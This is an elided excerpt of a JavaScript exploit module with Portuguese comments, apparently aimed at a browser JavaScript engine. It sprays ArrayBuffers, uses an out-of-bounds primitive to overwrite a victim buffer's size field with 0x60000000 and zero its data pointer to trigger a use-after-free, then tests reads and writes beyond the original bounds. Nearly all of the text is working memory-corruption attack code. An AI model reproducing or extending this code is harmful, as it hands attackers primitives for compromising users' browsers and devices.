...
async function attemptReadWriteOnCorruptedBuffer(ab, originalSize, newExpectedSize, logFn = logS3, FNAME_PARENT = "") {
    logFn(` -> Verificando AB corrompido: Original Size=${originalSize}, Current Size=${ab.byteLength}, Target Corrupted Size=${newExpectedSize}`, "info", FNAME_PARENT);

    if (ab.byteLength !== newExpectedSize) {
        logFn(`    -> FALHA NA VERIFICAÇÃO DE TAMANHO: AB.byteLength é ${ab.byteLength}, esperava ${toHex(newExpectedSize)}.`, "error", FNAME_PARENT);
        return false;
    }
    ...
    try {
        ...
        const readOffsetBeyondOriginal = originalSize + Math.floor(originalSize / 4); // Tentar ler/escrever um pouco além do limite original
...
export async function testCorruptArrayBufferStructure() {
    ...
    const CORRUPTION_AB_CONFIG = {
        spray_count: 200,
        victim_ab_size: 256,
        // Use os offsets validados do config.mjs (após suas correções com base no disassembly)
        ...
        corrupted_size_value: 0x60000000, // Um pouco menor que 0x7FFFFFFF para evitar problemas com signed int.
        corrupted_data_ptr_low_UAF: 0x0, // Para tentar causar UAF por NULL ptr
        corrupted_data_ptr_high_UAF: 0x0,

        search_base_offset_start: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - (256 * 10), // Aumentar range de busca para trás
        search_base_offset_end: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (OOB_CONFIG.ALLOCATION_SIZE || 32768) - 512, // Deixar margem no final
        search_step: 8,
    ...
    for (let attempt = 0; attempt < CORRUPTION_AB_CONFIG.attempts; attempt++) {
        ...
        for (let baseCandidateOffsetForVictimAB = CORRUPTION_AB_CONFIG.search_base_offset_start;
            ...
            if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
            if (baseCandidateOffsetForVictimAB < 0 || baseCandidateOffsetForVictimAB + Math.max(CORRUPTION_AB_CONFIG.size_field_offset_in_ab_object + 4, CORRUPTION_AB_CONFIG.data_ptr_field_offset_in_ab_object + 8) > oob_array_buffer_real.byteLength) continue;
            ...
            // --- TENTATIVA 2: Corromper PONTEIRO DE DADOS ---
            ...
            if (absOffsetForVictimDataPtrField >= 0 && absOffsetForVictimDataPtrField + 8 <= oob_array_buffer_real.byteLength) {
                ...
                for (let i = 0; i < victimAbs.length; i++) {
                    ...
                    try {
                        ...
                        dvCheck.getUint8(0); // Tenta acessar. Se o ponteiro foi zerado, DEVE crashar ou dar erro aqui.
                        logS3(`  AB ${i} acessado após corrupção de data_ptr. Se o ponteiro foi zerado, isto é inesperado (não crashou).`, "warn", FNAME);
                    } catch (e_check_dp) {
             ...
             if (baseCandidateOffsetForVictimAB % (CORRUPTION_AB_CONFIG.search_step * 50) === 0) await PAUSE_S3(MEDIUM_PAUSE_S3 / 2); // Pausa mais frequente mas curta
        }
        clearOOBEnvironment();
        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
        logS3(`Fim da Tentativa #${attempt + 1}. Pausando antes da próxima...`);
        if (attempt + 1 < CORRUPTION_AB_CONFIG.attempts) await PAUSE_S3(LONG_PAUSE_S3);
    }
